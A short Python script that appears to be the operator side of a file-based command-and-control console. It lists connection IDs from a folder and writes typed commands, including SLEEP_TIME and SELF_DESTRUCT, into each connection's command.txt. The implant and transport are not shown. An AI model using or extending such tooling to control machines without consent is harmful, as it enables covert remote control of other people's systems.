import os
import time

setID = 0
setCommand = ""
setSleep = 0

SLEEP_TIME = 30
CHECK_FLAG = 0

print("Opening Terminal: ")
dirnames =os.listdir('./connections')
for i in dirnames:
    print("Existing Connection for id " + i)
print("Enter Command: ")
while True:
    newDirnames =os.listdir('./connections')
    for i in newDirnames:
        if i not in dirnames:
            print("New Connection for id " + i)
            dirnames.append(i)
    if setID == 0:
        val = input("Choose ID: ")
        if val.isnumeric() and int(val) > 0 and val in dirnames:
            setID = val
            print("ID Set: " + setID)
            CHECK_FLAG = 0
        elif val == "sleep":
            CHECK_FLAG = 1
           
        else: 
            print("Invalid ID")
            continue
        if CHECK_FLAG != 0:
            time.sleep(SLEEP_TIME)
            continue
    val = input("$ ")
    tokenized = val.split(" ")
    #print(tokenized)
    if tokenized[0] == "SLEEP_TIME":
        commandNew = val
    elif tokenized[0] == "SELF_DESTRUCT":
        commandNew = val
        setID = 0
    elif tokenized[0] == "SWITCH":
        setID = 0
        continue 
    elif tokenized[0] == "":
        continue
    else:
        commandNew = val    
    f = open("connections/"+setID+"/command.txt", "w+")
    f.write(commandNew)
    f.close()